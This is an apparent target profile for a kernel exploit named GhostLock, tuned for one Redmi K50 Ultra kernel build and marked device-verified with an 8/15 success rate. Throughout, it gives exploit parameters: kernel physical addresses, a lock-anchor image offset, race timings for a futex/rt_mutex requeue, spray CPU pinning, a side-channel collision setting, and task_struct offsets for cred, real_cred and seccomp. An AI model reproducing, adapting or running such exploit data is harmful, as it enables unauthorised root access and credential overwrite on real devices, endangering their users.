# GhostLock kernel profile: Redmi K50 Ultra (diting, SM8475), 5.10.236 GKI.
# DEVICE-VERIFIED 2026-10-08 (full chain; success rate 8/15). select_stack is
# the shipped route; multicast_waiter is geometrically out of band here.
release = "5.10.236-android12-9-00003-gfb24cf99ad97-ab14313284"
schema_version = 1
kernel_major = 5
recommend_shizuku = 0
kernel_phys_load = 2818572288              # "Kernel code" start, /proc/iomem
kernel_phys_offset = 2147483648            # DRAM base
route {
  select_stack {
    # pselect 0xa0+0x1c0; futex 0x90+0x70+0x1a0; both objects at depth 0x210.
    waiter_shift = -2
    compact_waiter = 1
    # dump_skip.zeroes, image +0x2a3a590: zero, writable, read-only references.
    # Absent => the reclaimed page is used.
    lock_anchor_image = 44279184
    # 0x1000 = the array extent; 0x20 = rt_mutex size (owner at +0x18).
    lock_anchor_bytes = 4096
    lock_anchor_stride = 32
  }
}
fallback {
  to = "none"
}
execution {
  # Little cores fail here: spray children get EINVAL pinning to CPU 0.
  selected_cpus {
    main = 4
    consumer = 5
  }
  race {
    # Must stay meaningfully above setup_settle_us, or the requeue misses the park.
    route_wait_ms = 30
    setup_settle_us = 10000
  }
  routes {
    select_stack {
      # Do not tune: both orderings of the consumer walk and the erase are fatal.
      enter_delay_us = 5000
    }
  }
}
kernelsnitch {
  collisions = 8
  # 960 = /proc/slabinfo objsize; 1024 is the extractor template default.
  mm_struct_sz = 960
}
task_struct {
  prio = 132
  normal_prio = 140
  sched_task_group = 784
  pi_lock = 2156
  pi_waiters = 2176
  pi_top_task = 2192
  pi_blocked_on = 2200
  pid = 1480
  tgid = 1484
  atomic_flags = 1424
  real_cred = 1912
  cred = 1920
  comm = 1936
  tasks = 1224
  seccomp = 2120
}
